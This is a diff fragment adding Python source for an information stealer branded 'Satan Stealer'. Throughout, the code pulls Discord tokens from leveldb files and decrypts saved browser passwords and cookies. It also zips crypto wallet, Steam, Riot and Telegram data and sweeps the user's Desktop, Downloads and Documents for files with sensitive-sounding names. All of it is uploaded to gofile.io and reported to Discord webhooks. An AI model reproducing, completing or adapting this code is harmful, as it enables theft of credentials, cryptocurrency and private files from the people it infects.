+            "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
+            "attachments": []
+            }
+        urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
+        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+        return
+
+
+
+# def upload(name, tk=''):
+#     headers = {
+#         "Content-Type": "application/json",
+#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+#     }
+
+#     # r = requests.post(hook, files=files)
+#     LoadRequests("POST", hook, files=files)
+
+def writeforfile(data, name):
+    path = os.getenv("TEMP") + f"\wp{name}.txt"
+    with open(path, mode='w', encoding='utf-8') as f:
+        f.write(f"<--Satan STEALER ON TOP-->\n\n")
+        for line in data:
+            if line[0] != '':
+                f.write(f"{line}\n")
+
+Tokens = ''
+def getToken(path, arg):
+    if not os.path.exists(path): return
+
+    path += arg
+    for file in os.listdir(path):
+        if file.endswith(".log") or file.endswith(".ldb")   :
+            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
+                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
+                    for token in re.findall(regex, line):
+                        global Tokens
+                        if checkToken(token):
+                            if not token in Tokens:
+                                # print(token)
+                                Tokens += token
+                                uploadToken(token, path)
+
+Passw = []
+def getPassw(path, arg):
+    global Passw, PasswCount
+    if not os.path.exists(path): return
+
+    pathC = path + arg + "/Login Data"
+    if os.stat(pathC).st_size == 0: return
+
+    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+
+    shutil.copy2(pathC, tempfold)
+    conn = sql_connect(tempfold)
+    cursor = conn.cursor()
+    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
+    data = cursor.fetchall()
+    cursor.close()
+    conn.close()
+    os.remove(tempfold)
+
+    pathKey = path + "/Local State"
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = CryptUnprotectData(master_key[5:])
+
+    for row in data: 
+        if row[0] != '':
+            for wa in keyword:
+                old = wa
+                if "https" in wa:
+                    tmp = wa
+                    wa = tmp.split('[')[1].split(']')[0]
+                if wa in row[0]:
+                    if not old in paswWords: paswWords.append(old)
+            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
+            PasswCount += 1
+    writeforfile(Passw, 'passw')
+
+Cookies = []    
+def getCookie(path, arg):
+    global Cookies, CookiCount
+    if not os.path.exists(path): return
+    
+    pathC = path + arg + "/Cookies"
+    if os.stat(pathC).st_size == 0: return
+    
+    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    
+    shutil.copy2(pathC, tempfold)
+    conn = sql_connect(tempfold)
+    cursor = conn.cursor()
+    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+    data = cursor.fetchall()
+    cursor.close()
+    conn.close()
+    os.remove(tempfold)
+
+    pathKey = path + "/Local State"
+    
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = CryptUnprotectData(master_key[5:])
+
+    for row in data: 
+        if row[0] != '':
+            for wa in keyword:
+                old = wa
+                if "https" in wa:
+                    tmp = wa
+                    wa = tmp.split('[')[1].split(']')[0]
+                if wa in row[0]:
+                    if not old in cookiWords: cookiWords.append(old)
+            Cookies.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
+            CookiCount += 1
+    writeforfile(Cookies, 'cook')
+
+def GetDiscord(path, arg):
+    if not os.path.exists(f"{path}/Local State"): return
+
+    pathC = path + arg
+
+    pathKey = path + "/Local State"
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = CryptUnprotectData(master_key[5:])
+    # print(path, master_key)
+    
+    for file in os.listdir(pathC):
+        # print(path, file)
+        if file.endswith(".log") or file.endswith(".ldb")   :
+            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
+                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                    global Tokens
+                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
+                    if checkToken(tokenDecoded):
+                        if not tokenDecoded in Tokens:
+                            # print(token)
+                            Tokens += tokenDecoded
+                            # writeforfile(Tokens, 'tokens')
+                            uploadToken(tokenDecoded, path)
+
+def GatherZips(paths1, paths2, paths3):
+    thttht = []
+    for patt in paths1:
+        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
+        a.start()
+        thttht.append(a)
+
+    for patt in paths2:
+        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
+        a.start()
+        thttht.append(a)
+    
+    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
+    a.start()
+    thttht.append(a)
+
+    for thread in thttht: 
+        thread.join()
+    global WalletsZip, GamingZip, OtherZip
+        # print(WalletsZip, GamingZip, OtherZip)
+
+    wal, ga, ot = "",'',''
+    if not len(WalletsZip) == 0:
+        wal = "<:ETH:975438262053257236> •  Wallets\n"
+        for i in WalletsZip:
+            wal += f"└─ [{i[0]}]({i[1]})\n"
+    if not len(WalletsZip) == 0:
+        ga = "<a:8593blackstar:1042395444606672927>  •  Gaming:\n"
+        for i in GamingZip:
+            ga += f"└─ [{i[0]}]({i[1]})\n"
+    if not len(OtherZip) == 0:
+        ot = "<a:LV1:1042397877722423368>  •  Apps\n"
+        for i in OtherZip:
+            ot += f"└─ [{i[0]}]({i[1]})\n"          
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+
+    data = {
+        "content": globalInfo(),
+        "embeds": [
+            {
+            "title": "Satan Zips",
+            "description": f"{wal}\n{ga}\n{ot}",
+            "color": 2895667,
+            "footer": {
+                "text": "Satan Stealer",
+                "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+            }
+            }
+        ],
+        "username": "Satan Stealer",
+        "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
+        "attachments": []
+    }
+    urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
+    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+
+
+def ZipTelegram(path, arg, procc):
+    global OtherZip
+    pathC = path
+    name = arg
+    if not os.path.exists(pathC): return
+    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+
+    zf = ZipFile(f"{pathC}/{name}.zip", "w")
+    for file in os.listdir(pathC):
+        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
+            zf.write(pathC + "/" + file)
+    zf.close()
+
+    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+    
+    os.remove(f"{pathC}/{name}.zip")
+    OtherZip.append([arg, lnik])
+
+def ZipThings(path, arg, procc):
+    pathC = path
+    name = arg
+    global WalletsZip, GamingZip, OtherZip
+    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
+    # os.system(f"taskkill /im {procc} /t /f")
+
+    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
+        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
+        name = f"Metamask_{browser}"
+        pathC = path + arg
+    
+    if not os.path.exists(pathC): return
+    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+
+    if "Wallet" in arg or "NationsGlory" in arg:
+        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
+        name = f"{browser}"
+
+    elif "Steam" in arg:
+        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
+        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
+        data = f.readlines()
+        # print(data)
+        found = False
+        for l in data:
+            if 'RememberPassword"\t\t"1"' in l:
+                found = True
+        if found == False: return
+        name = arg
+
+
+    zf = ZipFile(f"{pathC}/{name}.zip", "w")
+    for file in os.listdir(pathC):
+        if not ".zip" in file: zf.write(pathC + "/" + file)
+    zf.close()
+
+    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+    
+    os.remove(f"{pathC}/{name}.zip")
+
+    if "Wallet" in arg or "eogaeaoehlef" in arg:
+        WalletsZip.append([name, lnik])
+    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
+        GamingZip.append([name, lnik])
+    else:
+        OtherZip.append([name, lnik])
+
+
+def GatherAll():
+    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
+    browserPaths = [
+        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
+        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
+        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
+        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
+        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
+    ]
+
+    discordPaths = [
+        [f"{roaming}/Discord", "/Local Storage/leveldb"],
+        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
+        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
+        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
+    ]
+
+    PathsToZip = [
+        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
+        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
+        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
+        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
+        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
+    ]
+    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
+
+    for patt in browserPaths: 
+        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
+        a.start()
+        Threadlist.append(a)
+    for patt in discordPaths: 
+        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
+        a.start()
+        Threadlist.append(a)
+
+    for patt in browserPaths: 
+        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
+        a.start()
+        Threadlist.append(a)
+
+    ThCokk = []
+    for patt in browserPaths: 
+        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
+        a.start()
+        ThCokk.append(a)
+
+    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
+
+
+    for thread in ThCokk: thread.join()
+    DETECTED = Trust(Cookies)
+    if DETECTED == True: return
+
+    # for patt in browserPaths:
+    #     threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
+    
+    # for patt in PathsToZip:
+    #     threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
+    
+    # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()
+
+    for thread in Threadlist: 
+        thread.join()
+    global upths
+    upths = []
+
+    for file in ["wppassw.txt", "wpcook.txt"]: 
+        # upload(os.getenv("TEMP") + "\\" + file)
+        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
+
+def uploadToAnonfiles(path):
+    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
+    except:return False
+
+# def uploadToAnonfiles(path):s
+#     try:
+#         files = { "file": (path, open(path, mode='rb')) }
+#         upload = requests.post("https://transfer.sh/", files=files)
+#         url = upload.text
+#         return url
+#     except:
+#         return False
+
+def KiwiFolder(pathF, keywords):
+    global KiwiFiles
+    maxfilesperdir = 7
+    i = 0
+    listOfFile = os.listdir(pathF)
+    ffound = []
+    for file in listOfFile:
+        if not os.path.isfile(pathF + "/" + file): return
+        i += 1
+        if i <= maxfilesperdir:
+            url = uploadToAnonfiles(pathF + "/" + file)
+            ffound.append([pathF + "/" + file, url])
+        else:
+            break
+    KiwiFiles.append(["folder", pathF + "/", ffound])
+
+KiwiFiles = []
+def KiwiFile(path, keywords):
+    global KiwiFiles
+    fifound = []
+    listOfFile = os.listdir(path)
+    for file in listOfFile:
+        for worf in keywords:
+            if worf in file.lower():
+                if os.path.isfile(path + "/" + file) and ".txt" in file:
+                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
+                    break
+                if os.path.isdir(path + "/" + file):
+                    target = path + "/" + file
+                    KiwiFolder(target, keywords)
+                    break
+
+    KiwiFiles.append(["folder", path, fifound])
+
+def Kiwi():
+    user = temp.split("\AppData")[0]
+    path2search = [
+        user + "/Desktop",
+        user + "/Downloads",
+        user + "/Documents"
+    ]
+
+    key_wordsFolder = [
+        "account",
+        "acount",
+        "passw",
+        "secret"
+
+    ]
+
+    key_wordsFiles = [
+        "passw",
+        "mdp",
+        "motdepasse",
+        "mot_de_passe",
+        "login",
+        "secret",
+        "account",
+        "acount",
+        "paypal",
+        "banque",
+        "account",
+        "metamask",
+        "wallet",
+        "crypto",
+        "exodus",
+        "discord",
+        "2fa",
+        "code",
+        "memo",
+        "compte",
+        "token",
+        "backup",
+        "oge",
+        "4l",
+        "pdf",
+        "info",
+        "@",
+        "3l",
+        "insta",
+        "early",
+        "14d",
+        "autoclaim",
+        "method",
+        "pull",
+        "nft",
+        "tiktok"
+        "secret"
+        ]
+
+    wikith = []
+    for patt in path2search: 
+        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
+        wikith.append(kiwi)
+    return wikith
+
+
+global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip
+
+keyword = [
+    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[ogu](https://ogu.gg/)', '[epicnpc](https://epicnpc.com)', '[github](https://github.com)', '[krunker](https://krunker.io)' 
+]
+
+CookiCount, PasswCount = 0, 0
+cookiWords = []
+paswWords = []
+
+WalletsZip = [] # [Name, Link]
+GamingZip = []
+OtherZip = []
+
+GatherAll()
+DETECTED = Trust(Cookies)
+# DETECTED = False
+if not DETECTED:
+    wikith = Kiwi()
+
+    for thread in wikith: thread.join()
+    time.sleep(0.2)
+
+    filetext = "\n"
+    for arg in KiwiFiles:
+        if len(arg[2]) != 0:
+            foldpath = arg[1]
+            foldlist = arg[2]       
+            filetext += f" <:openfolderblackandwhitevariant:1042409305254670356> {foldpath}\n"
+
+            for ffil in foldlist:
+                a = ffil[0].split("/")
+                fileanme = a[len(a)-1]
+                b = ffil[1]
+                filetext += f"└─<:open_file_folder: [{fileanme}]({b})\n"
+            filetext += "\n"
+    upload("kiwi", filetext)
